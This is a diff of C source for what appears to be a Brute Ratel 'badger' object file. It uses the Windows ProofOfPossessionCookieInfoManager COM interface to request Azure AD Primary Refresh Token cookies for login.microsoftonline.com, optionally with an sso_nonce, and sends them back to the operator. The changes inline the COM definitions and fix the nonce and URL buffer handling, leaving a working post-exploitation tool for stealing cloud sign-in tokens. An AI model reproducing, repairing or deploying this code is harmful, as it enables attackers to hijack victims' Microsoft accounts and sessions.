@@ -1,61 +1,99 @@
 #include <windows.h>
 #include <stdio.h>
-#include <proofofpossessioncookieinfo.h>
+
+#include "definitions.h"
+// #include "proofofpossessioncookieinfo.h"
 #include "badger_exports.h"
 
-WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
-WINBASEAPI int __cdecl MSVCRT$vsnprintf(char * __restrict__ d,size_t n,const char * __restrict__ format,va_list arg);
-WINBASEAPI errno_t __cdecl MSVCRT$mbstowcs_s(size_t *pReturnValue, wchar_t * wcstr, size_t smt,const char *mbstr, size_t count);
+typedef struct ProofOfPossessionCookieInfo
+    {
+    LPWSTR name;
+    LPWSTR data;
+    DWORD flags;
+    LPWSTR p3pHeader;
+    } 	ProofOfPossessionCookieInfo;
 
-WINBASEAPI LPWSTR WINAPI KERNEL32$lstrcpynW (LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength);
-WINBASEAPI LPWSTR WINAPI KERNEL32$lstrcatW (LPWSTR lpString1, LPCWSTR lpString2);
-WINBASEAPI int WINAPI Kernel32$WideCharToMultiByte (UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
-
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CLSIDFromString (LPCOLESTR lpsz, LPCLSID pclsid);
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$IIDFromString (LPCOLESTR lpsz, LPIID lpiid);
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx (LPVOID pvReserved, DWORD dwCoInit);
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance (REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
-DECLSPEC_IMPORT void	WINAPI OLE32$CoTaskMemFree(LPVOID pv);
+__inline void FreeProofOfPossessionCookieInfoArray(_In_reads_(cookieInfoCount) ProofOfPossessionCookieInfo* cookieInfo, DWORD cookieInfoCount)
+{                                                
+     DWORD i;                                    
+     for (i = 0; i < cookieInfoCount; i++)       
+     {                                           
+         CoTaskMemFree(cookieInfo[i].name);      
+         CoTaskMemFree(cookieInfo[i].data);      
+         CoTaskMemFree(cookieInfo[i].p3pHeader); 
+     }                                           
+     CoTaskMemFree(cookieInfo);                  
+}   
 
 typedef interface IProofOfPossessionCookieInfoManager IProofOfPossessionCookieInfoManager;
+EXTERN_C const IID IID_IProofOfPossessionCookieInfoManager;
 
-DECLSPEC_IMPORT HRESULT WINAPI COOKIE$GetCookieInfoForUri(LPCWSTR uri, DWORD *cookieInfoCount, ProofOfPossessionCookieInfo **cookieInfo);
+typedef struct IProofOfPossessionCookieInfoManagerVtbl
+{
+	BEGIN_INTERFACE
+	
+	HRESULT ( STDMETHODCALLTYPE *QueryInterface )( 
+		__RPC__in IProofOfPossessionCookieInfoManager * This,
+		/* [in] */ __RPC__in REFIID riid,
+		/* [annotation][iid_is][out] */ 
+		_COM_Outptr_  void **ppvObject);
+	
+	ULONG ( STDMETHODCALLTYPE *AddRef )( 
+		__RPC__in IProofOfPossessionCookieInfoManager * This);
+	
+	ULONG ( STDMETHODCALLTYPE *Release )( 
+		__RPC__in IProofOfPossessionCookieInfoManager * This);
+	
+	HRESULT ( STDMETHODCALLTYPE *GetCookieInfoForUri )( 
+		__RPC__in IProofOfPossessionCookieInfoManager * This,
+		/* [in] */ __RPC__in LPCWSTR uri,
+		/* [out] */ __RPC__out DWORD *cookieInfoCount,
+		/* [size_is][size_is][out] */ __RPC__deref_out_ecount_full_opt(*cookieInfoCount) ProofOfPossessionCookieInfo **cookieInfo);
+	
+	END_INTERFACE
+} IProofOfPossessionCookieInfoManagerVtbl;
 
-int requestaadprt(LPCWSTR uri) {
-	BadgerDispatch(g_dispatch, "Using uri: %ls\n", uri);
+interface IProofOfPossessionCookieInfoManager
+{
+	CONST_VTBL struct IProofOfPossessionCookieInfoManagerVtbl *lpVtbl;
+};
+
+
+void requestaadprt(LPCWSTR uri) {
+	BadgerDispatch(g_dispatch, "[*] Using uri: %ls\n", uri);
 	DWORD cookieCount = 0;
 	ProofOfPossessionCookieInfo* cookies;
 	IProofOfPossessionCookieInfoManager* popCookieManager;
 	GUID CLSID_ProofOfPossessionCookieInfoManager;
-	GUID IID_IProofOfPossessionCookieInfoManager;
+	GUID lIID_IProofOfPossessionCookieInfoManager;
 
 	OLE32$CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
-	OLE32$IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &IID_IProofOfPossessionCookieInfoManager);
+	OLE32$IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &lIID_IProofOfPossessionCookieInfoManager);
 
 	HRESULT hr = OLE32$CoInitializeEx(NULL, 0x0);
 	if (hr == RPC_E_CHANGED_MODE){
 		hr = OLE32$CoInitializeEx(NULL, 0x2);	
 	}
 	if (FAILED(hr))	{
-		BadgerDispatch(g_dispatch, "[!] CoInitialize error: 0x%04x\n", hr);
-		return 0;
+		BadgerDispatch(g_dispatch, "[-] CoInitialize 0x%04x\n", hr);
+		return;
 	}
 
-	hr = OLE32$CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieInfoManager, (void**)(&popCookieManager));
+	hr = OLE32$CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &lIID_IProofOfPossessionCookieInfoManager, (void**)(&popCookieManager));
 	if (FAILED(hr))	{
-		BadgerDispatch(g_dispatch, "[!] CoCreateInstance error: 0x%4x\n", hr);;
-		return 0;
+		BadgerDispatch(g_dispatch, "[-] CoCreateInstance 0x%4x\n", hr);;
+		return;
 	}
 
 	hr = popCookieManager->lpVtbl->GetCookieInfoForUri(popCookieManager, uri, &cookieCount, &cookies);
 	if (FAILED(hr))	{
-		BadgerDispatch(g_dispatch, "[!] GetCookieInfoForUri error: 0x%4x\n", hr);
-		return 0;
+		BadgerDispatch(g_dispatch, "[-] GetCookieInfoForUri 0x%4x\n", hr);
+		return;
 	}
 
 	if (cookieCount == 0) {
 		BadgerDispatch(g_dispatch, "[*] No cookies for the URI\n");
-		return 0;
+		return;
 	}
 
 	for (DWORD i = 0; i < cookieCount; i++) {
@@ -69,47 +107,60 @@ int requestaadprt(LPCWSTR uri) {
 		OLE32$CoTaskMemFree(cookies[i].p3pHeader);
 	}
 	OLE32$CoTaskMemFree(cookies);
-	return 0;
 }
 
 void coffee(char** argv, int argc, WCHAR** dispatch){
-	const wchar_t * nonce = NULL;
+	wchar_t * nonce = NULL;
+
+	g_dispatch = dispatch;
 
     // Optional argument nonce
     if (argc >= 1) {
         LPSTR pszNonce = argv[0];
-        int len = MultiByteToWideChar(CP_ACP, 0, pszNonce, -1, NULL, 0);
+        
+		int cch = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, pszNonce, -1, NULL, 0);
+		if (cch <= 0) {
+			BadgerDispatch(g_dispatch, "[-] MultiByteToWideChar(size) failed.\n");
+			goto cleanup;
+		}
 
-        if (len > 0) {
-            nonce = (wchar_t *)BadgerAlloc(len * sizeof(wchar_t));
-            if (nonce == NULL){
-                BadgerDispatch(g_dispatch, "[!] BadgerAlloc failed.\n");
-                return;
-            }
-        }
+        nonce = (wchar_t *)BadgerAlloc((size_t)cch * sizeof(wchar_t));
+		if (!nonce) {
+			BadgerDispatch(g_dispatch, "[-] BadgerAlloc failed for nonce.\n");
+			goto cleanup;
+		}
+
+		if (KERNEL32$MultiByteToWideChar(CP_UTF8, 0, pszNonce, -1, nonce, cch) <= 0) {
+			BadgerDispatch(g_dispatch, "[-] MultiByteToWideChar(conv) failed.\n");
+			goto cleanup;
+		}
     }
 
-    // TODO: Build URL here and pass to requestaadprt... That way cleanup is easier
 	LPCWSTR uri = L"https://login.microsoftonline.com/";
 	wchar_t * full_uri = NULL;
 
-	if (nonce != NULL) {
-		const wchar_t * base_url = L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=";
+	if (nonce) {
+		LPCWSTR base_url = L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=";
 
-		full_uri = (wchar_t*)BadgerAlloc(MSVCRT$wcslen(base_url) + MSVCRT$wcslen(nonce) + 2*sizeof(wchar_t));
-		if(full_uri == NULL){
-			BadgerDispatch(g_dispatch, "[!] Failed to initialize memory.\n");
+		size_t base_len  = BadgerWcslen((WCHAR*)base_url);
+		size_t nonce_len = BadgerWcslen((WCHAR*)nonce);
+		size_t total_cch = base_len + nonce_len + 1;
+
+		full_uri = (wchar_t *)BadgerAlloc(total_cch * sizeof(wchar_t));
+		if (!full_uri) {
+			BadgerDispatch(g_dispatch, "[-] BadgerAlloc failed for full_uri.\n");
 			goto cleanup;
 		}
-		KERNEL32$lstrcpynW(full_uri, base_url, MSVCRT$wcslen(base_url) + MSVCRT$wcslen(nonce));
-		KERNEL32$lstrcatW(full_uri, nonce);
+
+		KERNEL32$lstrcpynW(full_uri, base_url, (int)(base_len + 1));
+		KERNEL32$lstrcpynW(full_uri + base_len, nonce, (int)(nonce_len + 1));
+
 		uri = full_uri;
 	}
 
-
-	requestaadprt(nonce);
+	requestaadprt(uri);
 
 cleanup:
     if(nonce) BadgerFree((PVOID*)&nonce);
     if(full_uri) BadgerFree((PVOID*)&full_uri);
-};
+}
